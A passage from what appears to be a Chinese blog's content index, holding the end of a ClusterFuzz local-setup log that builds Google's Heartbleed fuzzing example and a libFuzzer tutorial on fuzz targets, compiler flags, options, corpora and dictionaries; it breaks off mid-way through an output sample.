GOOGLE_APPLICATION_CREDENTIALS=\"/home/user/Downloads/[FILE_NAME].json\"\n```\n\n确认命令行是否可用使用 gcloud 命令\n\n```bash\ngcloud -v\n```\n\n![image-20200516230731150](https://tva1.sinaimg.cn/large/007S8ZIlly1geuoy94l3cj30fu064q3t.jpg)\n\n##### 使用依赖脚本安装依赖库\n\n该步骤请在clusterfuzz文件内执行，不然报错\n\n```bash\ncd clusterfuzz\n```\n\n利用官方自带的依赖脚本clusterfuzz/local/install_deps.bash进行安装，在该步骤运行时间长可能遇到的坑最多，究其根本还是代理问题，如果遇错请反复尝试本节开始的几个代理设置。\n\n该依赖脚本需要homebrew，请自行安装。如果按照官方命令无法安装（被墙）可将命令行中地址复制到浏览器，打开后保存网页为后缀sh格式到本地运行\n\n```http\nhttps://brew.sh/index_zh-cn\n```\n\n如果顺利，经过漫长等待install_deps.bash运行成功后如下图所示\n\n![截屏2020-05-16 下午6.47.09](https://tva1.sinaimg.cn/large/007S8ZIlly1geup36bgqkj30zo0pitpu.jpg)\n\n以上步骤看起来简单，但是实际安装过程会问题不断，github有人提供docker 镜像已成功打包，基于 ubuntu 16.04 系统。镜像中已运行完毕之前步骤，装好了所有依赖。镜像地址：https://hub.docker.com/r/chenhengjie123/clusterfuzz_local\n\n可通过 `docker run -it --name clusterfuzz --network host chenhengjie123/clusterfuzz_local` 进入镜像运行环境，进入后续的步骤。clusterfuzz 的源代码存放在镜像的 /clusterfuzz 目录。\n\n##### 加载pipenv\n\n运行`local/install_deps.bash`脚本后，通过运行以下命令激活pipenv：\n\n```bash\npipenv shell\n```\n\n这将加载当前环境中的所有Python依赖项。\n\n您可以通过运行以下命令来验证一切正常：\n\n```python\npython butler.py --help\n```\n\n![截屏2020-05-16 下午6.52.27](https://tva1.sinaimg.cn/large/007S8ZIlly1geupgryiiaj30wi0fa77g.jpg)\n\n#### 本地运行\n\n主要分为两个部分，一个是本地服务器，另一个是本地机器人实例\n\n##### 运行本地服务器\n\n首次运行，添加 `--bootstrap` 进行各个数据的初始化。同时加上 `--skip-install-deps` 可跳过依赖安装（之前依赖包已装，可大大加快速度）\n\n```python\npython butler.py run_server --bootstrap --skip-install-deps\n```\n\n如果不是第一次运行，要去掉 `--bootstrap` 参数，不然数据会重置。\n\n过程中会蹦提示需要安装java SDK\n\n```bash\nbrew cask install java\n```\n\n开始可能需要几秒钟。一旦看到类似的输出行`INFO  admin_server.py:] Starting admin server`，就可以通过导航到[http://localhost:9000](http://localhost:9000/)来看到Web界面。\n\n![image-20200516233611704](https://tva1.sinaimg.cn/large/007S8ZIlly1geups3cl4xj31ja0swtfz.jpg)\n\n![截屏2020-05-16 下午8.52.57](https://tva1.sinaimg.cn/large/007S8ZIlly1geupsm3z3mj31fm0ihacn.jpg)\n\n##### 运行执行机器人\n\n官方命令：\n\n```python\npython butler.py run_bot --name my-bot /path/to/my-bot\n```\n\n其中 my-bot 可以替换为喜欢的名称。 fzy-bot`\n\n```python\npython butler.py run_bot --name fzy-bot `pwd`/fzy-bot\n```\n\n执行成功后，可在前一步的管理员界面看到机器人状态。\n\n![截屏2020-05-17 下午1.49.22](https://tva1.sinaimg.cn/large/007S8ZIlly1gevsgtyq2jj31d60andge.jpg)\n\n可通过\n\n```bash\ntail -f `pwd`/fzy-bot/bot.log\n```\n\n查看机器人实时日志输出。\n\n至此clusterfuzz已经搭建起来了，下面的任务就是跑一个实际的例子看看真实效果\n\n#### 实例测试--OpenSSL心脏滴血\n\nLibFuzzer和AFL需要使用Clang编译器中的工具,使用Clang **6.0**或更高版本提供的功能。要获得Clang构建，可以从[快照页面](https://llvm.org/builds/)（Windows）下载它，或按照[apt页面](https://apt.llvm.org/)（Ubuntu / Debian）上的说明进行操作。否则，您可以从[发行版页面](http://releases.llvm.org/download.html)下载Clang发行[版，](http://releases.llvm.org/download.html)或使用包管理器安装一个Clang发行[版](http://releases.llvm.org/download.html)。我们将在示例中将这些编译器称为`$CC`和`$CXX`。在环境中进行设置，以便您可以复制并粘贴示例命令：\n\n```bash\nexport CC=/path/to/clang\nexport CXX=/path/to/clang++\n```\n\n如果是用的mac，直接装一个xcode或者xcode的命令行工具就行\n\nCommand Line Tools安装：\n\n```bash\nxcode-select --install \n```\n\n在安装完clang后，按照官方的教程开始安装OpenSSL的心脏滴血示例\n\n```bash\n# 下载并解压包含这个漏洞的 OpenSSL :\ncurl -O https:*//www.openssl.org/source/openssl-1.0.1f.tar.gz\ntar xf openssl-1.0.1f.tar.gz\n\n# 使用 AScan 和 fuzzer 插桩编译 OpenSSL:\ncd openssl-1.0.1f/\n./config    \n```\n\n注意，这里有个小坑，如果使用mac用./config后面clang时会出错，此处编译环境切记使用\n\n```bash\n./Configure darwin64-x86_64-cc\n\n```\n\n![截屏2020-05-17 下午4.18.41](https://tva1.sinaimg.cn/large/007S8ZIlly1gevsqs0wppj30wm0ic43k.jpg)\n\n继续向下走\n\n```bash\n# 注意：$CC 必须指向 clang 二进制文件。简单地说，按照这个命令来写就对了\nmake CC=\"$CC -g -fsanitize=address,fuzzer-no-link\"\ncd ..\n\n```\n\n![截屏2020-05-17 下午5.46.52](https://tva1.sinaimg.cn/large/007S8ZIlly1gevswbusfzj30w20co419.jpg)\n\n```bash\n# 下载 fuzz target 和它的数据依赖:\ncurl -O https://raw.githubusercontent.com/google/clusterfuzz/master/docs/setting-up-fuzzing/heartbleed/handshake-fuzzer.cc\ncurl -O https://raw.githubusercontent.com/google/clusterfuzz/master/docs/setting-up-fuzzing/heartbleed/server.key\ncurl -O https://raw.githubusercontent.com/google/clusterfuzz/master/docs/setting-up-fuzzing/heartbleed/server.pem\n```\n\n![截屏2020-05-17 下午5.46.34](https://tva1.sinaimg.cn/large/007S8ZIlly1gevsulwz8uj30wk0byq62.jpg)\n\n```bash\n# 编译可用于 ClusterFuzz 的 OpenSSL fuzz target （$CXX 需要指向一个 clang++ 二进制文件）:\n$CXX -g handshake-fuzzer.cc -fsanitize=address,fuzzer openssl-1.0.1f/libssl.a \\\n  openssl-1.0.1f/libcrypto.a -std=c++17 -Iopenssl-1.0.1f/include/ -lstdc++fs   \\\n  -ldl -lstdc++ -o handshake-fuzzer\n\nzip openssl-fuzzer-build.zip handshake-fuzzer server.key server.pem\n```\n\n这一步对于mac是个坑，会报错ld: library not found for -lstdc++fs\n\n![image-20200517221128743](https://tva1.sinaimg.cn/large/007S8ZIlly1gevsy9jf2pj31a20420tp.jpg)\n\n经过仔细地搜索发现在xcode10之后，苹果官方就已经取消了对stdc++包的支持\n\n![image-20200517221435111](https://tva1.sinaimg.cn/large/007S8ZIlly1gevt1hj96cj30iq02cwep.jpg)\n\n网上有论坛中提供一个思路，把开发者环境退回xcode10之前的一个系统版本（10.9）来回避这个问题，现版本为catalina（10.15） \n\n[升级到Mojave后，Pybind11无法正常工作或C ++无法编译：-lstdc ++未找到](https://stackoverflow.com/questions/53287975/pybind11-doesnt-work-or-c-doesnt-compile-after-upgrading-to-mojave-lstdc)\n\n```bash\nexport MACOSX_DEPLOYMENT_TARGET=10.9\n```\n\n退回后再次运行，会报错**'~path' is unavailable: introduced in macOS 10.15**\n\n![image-20200517222046241](https://tva1.sinaimg.cn/large/007S8ZIlly1gevt7xhfkdj31ay0k00x5.jpg)\n\n经过查阅无法从10.15生成可以针对/运行于10.15之前的MacOS版本的可执行文件\n\n[使用C ++ 17 std :: filesystem是否需要MacOS 1015？ （Xcode 111）](https://codebug.vip/questions-1992980.htm)\n\n这样就完全卡死了，新版本不支持包，老版本无法构建。正在寻找新的办法中\n\n//正在做，待补充ing\n\n\n\n\n\n参考资料：\n\n谷歌开源模糊测试工具 ClusterFuzz 尝鲜记录 (进行中)  https://testerhome.com/topics/18171\n\nClusterFuzz官方指南 https://google.github.io/clusterfuzz/getting-started/local-instance/\n\n开源工具ClusterFuzz的试用和解读 https://www.sohu.com/a/296397615_468741","tags":["fuzz","漏洞挖掘","clusterfuzz"],"categories":["二进制"]},{"title":"libFuzzer使用总结教程","url":"/2021/01/25/libfuzzer/","content":"\n本篇文章简述libFuzzer原理，配合各个实例介绍参数功能意义，为最终进一步的完全利用奠定基础\n\n<!-- more -->\n\n## 理论篇\n\n### libFuzzer是什么？\n\nLibFuzzer在概念上与American Fuzzy Lop（[AFL](http://lcamtuf.coredump.cx/afl/)）类似，但它是在单个进程中执行了所有模糊测试。进程内的模糊测试可能更具针对性，由于没有进程反复启动的开销，因此与AFL相比可能更快。\n\n按照官方定义，**libFuzzer** 是一个`in-process（进程内的）`，`coverage-guided（以覆盖率为引导的）`，`evolutionary（进化的）` 的 `fuzz` 引擎，是 `LLVM` 项目的一部分。据[Google官方技术博客](https://security.googleblog.com/2016/08/guided-in-process-fuzzing-of-chrome.html)的表述，这三个特性可分别解释为如下意义：\n\n- `in-process（进程内的）`：*we mean that we don’t launch a new process for every test case, and that we mutate inputs directly in memory.*  我们并没有为每一个测试用例都开启一个新进程，而是在一个进程内直接将数据投放在内存中。\n\n- `coverage-guided（以覆盖率为引导的）`：*we mean that we measure code coverage for every input, and accumulate test cases that increase overall coverage.* 我们对每一个输入都进行代码覆盖率的计算，并且不断积累这些测试用例以使代码覆盖率最大化。\n\n- `evolutionary（进化的）`：fuzz按照类型分为3类，这是最后一种。\n\n  > 第一类是基于生成的`Generation Based`通过对目标协议或文件格式建模的方法，从零开始产生测试用例，没有先前的状态；\n  >\n  > 第二类为基于突变的`Evolutionary`基于一些规则，从已有的数据样本或存在的状态变异而来；\n  >\n  > 最后一种就是基于进化的`Evolutionary`包含了上述两种，同时会根据代码覆盖率的回馈进行变异。\n\nLibFuzzer和要被测试的库链接在一起，通过一个特殊的模糊测试进入点（目标函数），用测试用例feed（喂）要被测试的库。fuzzer会跟踪哪些代码区域已经测试过，然后在输入数据的语料库上产生变异，来最大化代码覆盖。其中代码覆盖的信息由LLVM的SanitizerCoverage插桩提供。\n\n### libFuzzer与传统Fuzz相比的特点\n\n#### 传统fuzz面临问题\n\n- 搜索空间过于广泛\n- 无法fuzz特定的函数\n- 难以fuzz网络协议\n- 常规fuzz速度太慢\n\n传统的 `fuzz` 大多通过对已有的样本 **按照预先设置好的规则** 进行变异产生测试用例，然后喂给 目标程序同时监控目标程序的运行状态，这类 `fuzz` 有很多，比如: `peach` , `FileFuzz` 等。找寻漏洞的过程形如下图：\n\n![image-20200605210407383](https://tva1.sinaimg.cn/large/007S8ZIlly1gfhps16nolj30fs0aganf.jpg)\n\n#### libFuzzer的优势\n\n- In-process, in-memory\n- 会主动引导fuzz过程\n- 针对函数/协议级别的fuzz非常有效率\n- 1000x的快\n- 编写基于libfuzzer的fuzzer很容易\n- 可以单独跟随一个单元进行检测\n\nlibFuzzer所有的程序的主要功能都是对一些 **字节序列** 进行操作，基于这一个事实（`libfuzzer` 生成 随机的 字节序列 ，扔给 待`fuzz` 的程序，然后检测是否有异常出现） 所以在 `libfuzzer` 看来，`fuzz` 的目标 其实就是一个 以 **字节序列** 为输入的 **函数**。其过程形如下图：\n\n![image-20200605210458829](https://tva1.sinaimg.cn/large/007S8ZIlly1gfhpsxzyddj30g10ay49d.jpg)\n\n### libFuzzer的理论过程\n\n简单理解 `libfuzzer` 就是，如果我们要 `fuzz` 一个程序，找到一个入口函数，然后利用\n\n```\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n    .......\n    .......\n}\n```\n\n接口（hardness），我们可以拿到 `libfuzzer` 生成的 **测试数据以及测试数据的长度**，我们的任务就是**把这些生成的测试数据 传入到目标程序中 让程序来处理 测试数据， 同时要尽可能的触发更多的代码逻辑**。\n\n![image-20200605213711784](https://tva1.sinaimg.cn/large/007S8ZIlly1gfhqqg37osj30ig0a4aar.jpg)\n\n![image-20200605213753311](https://tva1.sinaimg.cn/large/007S8ZIlly1gfhqr5qln1j30ig09kaar.jpg)\n\n`libfuzzer` 已经把 一个 `fuzzer` 的核心（样本生成引擎和异常检测系统） 给做好了， 我们需要做的是根据目标程序的逻辑，把 `libfuzzer` 生成的数据，交给目标程序处理，然后在编译时采取合适的 `Sanitizer` 用于检测运行时出现的内存错误。\n\n## 实践篇\n\n实践部分建议学习查阅Google的**[libFuzzerTutorial](https://github.com/google/fuzzing/blob/master/tutorial/libFuzzerTutorial.md)**，内容比较完善跟随不同的案例逐个验证libFuzzer的具体功能，但是因为介绍每个功能采用的案例不同，可能对于新手来说割裂感比较严重，我把共用的部分摘取总结出来把这部分变成一个工具书，理想的是在一个具体案例中能够运用一遍所有的常用功能，这样更加连贯，具体实践放在最后的案例篇。\n\n### 安装\n\n官方推荐使用Ubuntu16.04 x64安装，其本身是`llvm`项目的一部分，和`clang`是亲兄弟，二者项目源码分别可见于https://github.com/llvm/llvm-project/tree/master/compiler-rt/lib/fuzzer和https://github.com/llvm/llvm-project/tree/master/clang，就在同一个仓库里面，现在稍微新的版本的clang都已经内置libFuzzer了，也可以使用llvm官方提供的脚本进行安装。\n\n```bash\n#!/bin/bash -eux\n# Copyright 2016 Google Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n################################################################################\n\nsudo apt-get update\nsudo apt-get upgrade -y\nsudo apt-get autoremove -y\n\nsudo apt-get install -y libc6-dev binutils libgcc-5-dev\n\nLLVM_DEP_PACKAGES=\"build-essential make cmake ninja-build git python2.7\"\nsudo apt-get install -y $LLVM_DEP_PACKAGES\n\nWORK_DIR=$PWD\nmkdir -p $WORK_DIR/src\n\n# Checkout\ncd $WORK_DIR/src && git clone --depth 1 http://llvm.org/git/llvm.git\ncd $WORK_DIR/src/llvm/tools && git clone --depth 1 http://llvm.org/git/clang.git\ncd $WORK_DIR/src/llvm/projects && git clone --depth 1 http://llvm.org/git/compiler-rt.git\ncd $WORK_DIR/src/llvm/projects && git clone --depth 1 http://llvm.org/git/libcxx.git\ncd $WORK_DIR/src/llvm/projects && git clone --depth 1 http://llvm.org/git/libcxxabi.git\n\n# Uncomment if you want *fresh* libFuzzer from checkouted repository.\n#rm -r $WORK_DIR/libFuzzer/Fuzzer\n#cp -r $WORK_DIR/src/llvm/projects/compiler-rt/lib/fuzzer/ $WORK_DIR/libFuzzer/Fuzzer\n\n# Build & Install\nmkdir -p $WORK_DIR/work/llvm\ncd $WORK_DIR/work/llvm\n\n# Consider adding of -DCMAKE_INSTALL_PREFIX=%PATH% flag, if you do not want to\n# install fresh llvm binaries into standard system paths.\ncmake -G \"Ninja\" \\\n      -DLIBCXX_ENABLE_SHARED=OFF -DLIBCXX_ENABLE_STATIC_ABI_LIBRARY=ON \\\n      -DCMAKE_BUILD_TYPE=Release -DLLVM_TARGETS_TO_BUILD=\"X86\" \\\n      $WORK_DIR/src/llvm\nninja -j$(nproc)\nsudo ninja install\nrm -rf $WORK_DIR/work/llvm\n```\n\n### 编写Fussing Target（hardness）\n\nlibFuzzer要求实现一个`fuzz target`作为被测对象的接口，这个入口点用来接收 libFuzzer 生成的 测试用例（比特序列）\n\n官方文档中的代码示例如下：\n\n```c++\n// fuzz_target.cc\nextern \"C\" int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {\n  DoSomethingInterestingWithMyAPI(Data, Size);\n  return 0;  // Non-zero return values are reserved for future use.\n}\n```\n\n名称参数返回值类型都不能动，并且注意参数中传来的字节数组`Data`是通过底层const修饰了的，也就是不允许修改其中数据。\n\n- `data` 是 `libFuzzer` 生成的 测试数据， `size` 是数据的长度\n\n- `fuzz` 引擎会在一个进程中进行多次 `fuzz`， 所以其效率非常高\n- 要能处理各种各样的输入 （空数据， 大量的 或者 畸形的数据...)\n- 内部不会调用 `exit()`\n- 如果使用多线程的话，在函数末尾要把 线程 `join`\n\nfuzzer target（即`LLVMFuzzerTestOneInput`函数）目的是作为被测对象与libFuzzer库之间的一个中转接口，其作用在于接受libFuzzer提供的输入数据`Data`字节串，（可能还需要进行数据格式转换，）然后传递给实际的被测函数（如上述示例中的`DoSomethingInterestingWithMyAPI`）。\n\n\n\n官方文档中对其有如下要求：\n\n- The fuzzing engine will execute the fuzz target many times with different inputs in the same process.\n\n  函数会在同一进程中多次执行，即被循环调用。\n\n- It must tolerate any kind of input (empty, huge, malformed, etc).\n\n  必须接受所有格式的输入。\n\n- It must not exit() on any input.\n\n  不允许主动退出，前面说了是循环调用，退出了就没法循环了。\n\n- It may use threads but ideally all threads should be joined at the end of the function.\n\n  可以开线程，但返回之前必须结束它，原因还是那个——循环调用，自己的线程自己关。\n\n- It must be as deterministic as possible. Non-determinism (e.g. random decisions not based on the input bytes) will make fuzzing inefficient.\n\n  其执行必须结果必须是具有确定性的，两次的Data如果一致，则两次执行的结果也必须一致。\n\n- It must be fast. Try avoiding cubic or greater complexity, logging, or excessive memory consumption.\n\n  速度，速度！毕竟模糊测试需要进行大量数据的测试。\n\n- Ideally, it should not modify any global state (although that’s not strict).\n\n  不允许修改全局变量，因为在同一个进程里，修改全局变量会导致下一次运行时读取的是修改后的结果，可能会违反前面说的确定性原则。\n\n- Usually, the narrower the target the better. E.g. if your target can parse several data formats, split it into several targets, one per format.\n\n  尽量窄范围测试，如果测试处理多种数据格式的目标，还是分割成多个子目标为好。这既是处于速度考量，也是出于模糊测试数据变异的效果考量。\n\n### 编译连接\n\n文档中给出的编译链接命令大致可归纳为：\n\n```bash\nclang++ -g -O1 -fsanitize=fuzzer,address -fsanitize-coverage=trace-pc-guard \\\nfuzz_target.cc ../../libFuzzer/Fuzzer/libFuzzer.a \\\n-o mytarget_fuzzer\n```\n\n- `-g`和`-O1`是gcc/clang的通用选项，前者保留调试信息，使错误消息更易于阅读；后者指定优化等级为1（保守地少量优化），但这两个选项不是必须的。\n\n- `-fsanitize=fuzzer`才是关键，通过这个选项启用libFuzzer，向libFuzzer提供进程中的覆盖率信息，并与libFuzzer运行时链接。\n\n- 除了`fuzzer`外，还可以附加其他sanitize（漂白剂）选项也可以加进来，如`-fsanitize=fuzzer,address`同时启用了地址检查。关于地址漂白剂详细作用可以查看llvm的官方文档[AddressSanitizer](http://clang.llvm.org/docs/AddressSanitizer.html)\n\n  > 常用内存错误检测工具\n  >\n  > `AddressSanitizer`: 检测 `uaf`, 缓冲区溢出，`stack-use-after-return`, `container-overflow`等内存访问错误，使用-fsanitize = address\n  >\n  > `MemorySanitizer（MSAN）`： 检测未初始化内存的访问，使用-fsanitize = memory。MSAN不能与其他消毒剂结合使用，应单独使用。\n  >\n  > `UndefinedBehaviorSanitizer（UBSAN）`： 检测一些其他的漏洞，整数溢出，类型混淆等，检测到C / C ++的各种功能的使用，这些功能已明确列出来导致未定义的行为。使用-fsanitize = undefined，也可以将ASAN和UBSAN合并到一个版本中。\n\n- `-fsanitize-coverage=trace-pc-guard`: 为 `libfuzzer` 提供代码覆盖率信息\n\n- `libFuzzer.a`: 为libfuzzer项目中执行`build.sh` 编译好生成的 `libFuzzer.a`\n\n- `-o fuzzer`:一个 **生成 测试用例， 交给目标程序测试，然后检测程序是否出现异常** 的程序\n\n这一步骤整体过程就是通过clang的`-fsanitize=fuzzer`选项可以启用libFuzzer，这个选项在编译和链接过程中生效，实现了条件判断语句和分支执行的记录，并且辅以libFuzzer中的库函数，通过生成不同的测试样例然后能够获得代码的覆盖率情况，最终实现所谓的fuzz testing。\n\n对这一过程感兴趣的可以阅读[libFuzzer编译链接](https://i-m.dev/posts/20190831-143715.html)，博主对比了正常clang编译和使用libFuzzer编译从准备—预处理—编译—汇编—链接全过程的对比，展示了libFuzzer在具体编译过程中的作用。\n\n这一步最终生成的就是这个fuzzer。\n\n### 开始测试\n\n被测程序在启用`libFuzzer`并编译链接后，即成为了一个可接受用户参数的命令行程序，直接执行程序便是启动测试。\n\n一般格式：\n\n```bash\n./your-fuzzer -flag1=val1 -flag2=val2 ... dir1 dir2 ...\n```\n\nflags代表各个控制测试过程的选项参数，可以提供零到任意个，但必须是严格的`-flag=value`形式\n\n- 选项前导用单横线，即使选项是一个词而非单个字符\n- 选项必须要提供对应的值，即使只是一个开关选项如`-help`，必须要写作`-help=1`，且选项与值中间只能用等号，不能用空格。\n\ndirs表示语料库目录，它们的内容都会被读取作为初始语料库，但测试过程中生成的新输入只会被保存到第一个目录下。\n\n常用有以下部分参数，全文我将附在博客的最后附件1中.\n\n*对于开关选项（如`help`），效用一列表示当参数启用时（`-help=1`）的效果*\n\n| 选项                | 默认 | 效用                                                         |\n| ------------------- | ---- | ------------------------------------------------------------ |\n| verbosity           | 1    | 运行时输出详细日志                                           |\n| seed                | 0    | 随机种子。如果为0，则自动生成                                |\n| runs                | -1   | 单个测试运行的次数（-1表示无限）                             |\n| max_len             | 0    | 测试输入的最大长度。若为0，libFuzzer会自行猜测               |\n| minimize_crash      | 0    | 如果为1，则最小化提供的崩溃输入。与-runs = N或-max_total_time = N一起使用以限制尝试次数。 |\n| reduce_inputs       | 1    | 尝试减小输入的大小，同时保留其全部功能集                     |\n| fork                | 0    | 在子过程中发生fuzzing的实验模式                              |\n| ignore_timeouts     | 1    | 在fork模式下忽略超时                                         |\n| ignore_crashes      | 0    | 在fork模式下忽略崩溃                                         |\n| ignore_ooms         | 1    | 在fork模式下忽略OOM                                          |\n| cross_over          | 1    | 交叉输入                                                     |\n| rss_limit_mb        | 2048 | 内存使用限制，以Mb为单位。使用0则禁用限制。                  |\n| mutate_depth        | 5    | 每个输入连续突变的数量                                       |\n| shuffle             | 1    | 启动时打乱初始语料库                                         |\n| prefer_small        | 1    | 打乱语料库时将小输入置于优先位置                             |\n| timeout             | 1200 | 若为正，表示单元运行最大秒数。超时会被提前中止               |\n| error_exitcode      | 77   | libFuzzer本身出错时的退出码                                  |\n| timeout_exitcode    | 77   | libFuzzer超时退出码                                          |\n| max_total_time      | 0    | 若为正，表示整个模糊测试运行最大秒数                         |\n| dict                | 0    | 提供输入关键字的字典                                         |\n| use_counters        | 1    | 使用[覆盖率计数器](http://clang.llvm.org/docs/SanitizerCoverage.html#coverage-counters)生成命中代码块的频率的近似计数；默认为1。 |\n| help                | 0    | 打印帮助并退出                                               |\n| merge               | 0    | 不损失覆盖率前提下，将第2/3/4/…个语料库合并到第一个中去      |\n| merge_control_file  | 0    | 指定合并进程的控制文件，用于恢复合并状态                     |\n| jobs                | 0    | 运行的作业数量。所有作业的输出会被重定向到fuzz-JOB.log。     |\n| workers             | 0    | 运行作业的并发进程数。若为0，实验CPU核心数一半               |\n| reload              | 1    | 每N秒载主语料库，以知悉其他进程发现的单元                    |\n| only_ascii          | 0    | 仅生成ASCII（isprint + isspace）输入                         |\n| artifact_prefix     | 0    | 提供将模糊处理工件（崩溃，超时或缓慢的输入）另存为`$（artifact_prefix）file`时要使用的前缀。默认为空。 |\n| exact_artifact_path | 0    | 如果为空则忽略（默认）。如果为非空，则将失败（崩溃，超时）时的单个工件写为`$（exact_artifact_path）`。这将覆盖 `-artifact_prefix，`并且不会在文件名中使用校验和。请勿将相同的路径用于多个并行进程。 |\n| detect_leaks        | 1    | 如果为1（默认值）并且启用了LeakSanitizer，则尝试在模糊测试期间检测内存泄漏（即，不仅在关闭时）。 |\n| print_final_stats   | 0    | 退出时打印统计信息                                           |\n| print_corpus_stats  | 0    | 退出时打印语料库元素统计信息                                 |\n| print_coverage      | 0    | 退出时打印覆盖率信息                                         |\n| close_fd_mask       | 0    | 为1则在关闭stdout，为2则关闭stderr，为3则关闭二者            |\n\n重运行模式：\n\n```bash\n./your-fuzzer -flag1=val1 -flag2=val2 ... file1 file2 ...\n```\n\n与上面一样，但是选项后面接的是文件列表而非文件夹列表，这些输入样例将会重新读取并输入运行，不会产生新样例，在回归测试时十分有用。\n\n这里有几个选项功能是值得单独说一下的\n\n#### Seed corpus 种子语料库\n\ncorpus语料库就是给目标程序的各种各样的输入\n\n```bash\nmkdir MY_CORPUS\n./your-fuzzer MY_CORPUS/ seeds/\n```\n\n当基于libFuzzer的模糊器以另一个目录作为参数执行时，它将首先递归地从每个目录中读取文件（在本例中MY_CORPUS/和seeds/都读），并对所有目录执行目标函数。然后，任何触发感兴趣的代码路径的输入将被写回到第一个语料库目录（在本例中为`MY_CORPUS`）。一般情况下我们将相关文件放在seeds的位置下，MY_CORPUS/目录为空，这样运行后生成的样本就存在MY_CORPUS/中了。\n\n#### 精简语料库样本集\n\n在模糊测试期间，测试语料库可能会增长到很大容量。如果希望最小化语料库，即创建具有相同覆盖率的语料库子集但容量却小很多，这就是一件性价比十分高的事情了。\n\n```bash\nmkdir corpus1_min\n./your-fuzzer -merge=1 corpus1_min corpus1\n```\n\n- `corpus1_min`: 精简后的样本集存放的位置\n- `corpus1`: 原始样本集存放的位置\n\n#### 并行运行\n\n提高模糊测试效率的另一种方法是使用更多的CPU。如果您使用`-jobs=N`它运行模糊器，它将产生N个独立的作业，但最多不超过拥有的内核数的一半。用于`-workers=M`设置允许的并行作业数。\n\n当指定了多个任务时，程序启动时会先产生一个`master`进程，同时并发启动相应数量个`worker`进程，master会把jobs分配到workers上去执行，当某个任务结束后，相应进程终止，同时master会启动一个新的任务进程分配到对应的worker上，平均每个worker上会分配*jobs/workers*个任务。\n\n```bash\n./your-fuzzer MY_CORPUS/ seeds/ -jobs=8\n```\n\n在8核计算机上，这将产生4个并行工作器。如果其中一个被退出，将自动创建另一个，最多8个。\n\n```bash\nfuzzer -jobs=8\n  ├─sh -c ./fuzzer >fuzz-0.log 2>&1\n  │   └─fuzzer\n  │       └─{fuzzer}\n  ├─sh -c ./fuzzer >fuzz-1.log 2>&1\n  │   └─fuzzer\n  │       └─{fuzzer}\n  ├─sh -c ./fuzzer >fuzz-2.log 2>&1\n  │   └─fuzzer\n  │       └─{fuzzer}\n  ├─sh -c ./fuzzer >fuzz-3.log 2>&1\n  │   └─fuzzer\n  │       └─{fuzzer}\n```\n\n#### Dictionaries 字典\n\n字典最早是afl在2015年一篇博客上提出的[afl-fuzz: making up grammar with a dictionary in hand](https://lcamtuf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.html)，\n\n基本思路就是应用程序都是都是**处理具有一定格式的数据**，比如 `xml` 文档， `png`图片等等。 这些数据中会有一些**特殊字符序列 （或者说关键字）**， 比如 在 `xml` 文档中 就有 `CDATA`,  等，**png图片** 就有 **png 图片头**。\n\n如果我们事先就把这些 **字符序列** 列举出来， `fuzz` 直接使用这些关键字去 组合，就会就可以减少很多没有意义的 尝试，同时还有可能会走到更深的程序分支中去。\n\n`Dictionary` 就是实现了这种思路。 `libfuzzer` 和 `afl` 使用的 `dictionary` 文件的语法是一样的， 所以可以直接拿 afl 里面的 `dictionary` 文件来给 `libfuzzer` 使用。\n\n如下是libFuzzer官方文档中的字典示例\n\n```bash\n# Lines starting with '#' and empty lines are ignored.\n\n# Adds \"blah\" (w/o quotes) to the dictionary.\nkw1=\"blah\"\n# Use \\\\ for backslash and \\\" for quotes.\nkw2=\"\\\"ac\\\\dc\\\"\"\n# Use \\xAB for hex values\nkw3=\"\\xF7\\xF8\"\n# the name of the keyword followed by '=' may be omitted:\n\"foo\\x0Abar\"\n```\n\n- `#` 开头的行 和 空行会被忽略\n- `kw1=` 这些就类似于注释， 没有意义\n- 真正有用的是由 `\"` 包裹的**字串**，这些 **字串** 就会作为一个个的关键字， `libfuzzer` 会用它们进行组合来生成样本。\n\n`libfuzzer` 使用 `-dict` 指定 `dict` 文件，下面使用 `xml.dict` 为 `dictionary` 文件，进行 `fuzz`。\n\n```bash\n./your-fuzzer -dict=DICTIONARY_FILE\n```\n\n### 输出\n\n当fuzzer成功运行之后，信息会输出在屏幕上。输出行具有事件代码和统计信息的形式。常见的事件代码是：\n\n- `READ` fuzzer已从语料库目录中读取了所有提供的输入样本。\n- `INITED` fuzzer已完成初始化，其中包括通过被测代码运行每个初始输入样本。\n- `NEW` fuzzer创建了一个测试输入，该输入涵盖了被测代码的新区域。此输入将保存到主要语料库目录。\n- `pulse` fuzzer已生成 2的n次方个输入（定期生成以使用户确信fuzzer仍在工作）。\n- `DONE` fuzzer已完成操作，因为它已达到指定的迭代限制（`-runs`）或时间限制（`-max_total_time`）。\n- `RELOAD` fuzzer在定期从语料库目录中重新加载输入；这使它能够发现其他fuzzer进程发现的任何输入（请参阅[并行模糊化](https://releases.llvm.org/4.0.0/docs/LibFuzzer.html#parallel-fuzzing)）。\n\n每条输出行还报告以下统计信息（非零时）：\n\n- `cov：` 执行当前语料库所覆盖的代码块或边的总数。\n- `ft：` libFuzzer使用不同的信号来评估代码覆盖率：边缘覆盖率，边缘计数器，值配置文件，间接调用方/被调用方对等。这些组合的信号称为*功能*（ft：）。\n- `corp：` 当前内存中测试语料库中的条目数及其大小（以字节为单位）。\n- `exec/s：` 每秒模糊器迭代的次数。\n- `rss：` 当前的内存消耗。\n\n对于`NEW`事件，输出行还包含有关产生新输入的变异操作的信息：\n\n- `L：` 新输入的大小（以字节为单位）。\n- `MS: <n> <operations>` 用于生成输入的变异操作的计数和列表。\n\n我们以如下样例作解释：\n\n```bash\nINFO: Seed: 1608565063\nINFO: Loaded 1 modules (37 guards): [0x788ec0, 0x788f54), \nINFO: -max_len is not provided, using 64\nINFO: A corpus is not provided, starting from an empty corpus\n#0  READ units: 1\n#1  INITED cov: 3 ft: 3 corp: 1/1b exec/s: 0 rss: 11Mb\n#3  NEW    cov: 4 ft: 4 corp: 2/4b exec/s: 0 rss: 12Mb L: 3 MS: 2 InsertByte-InsertByte-\n#3348   NEW    cov: 5 ft: 5 corp: 3/65b exec/s: 0 rss: 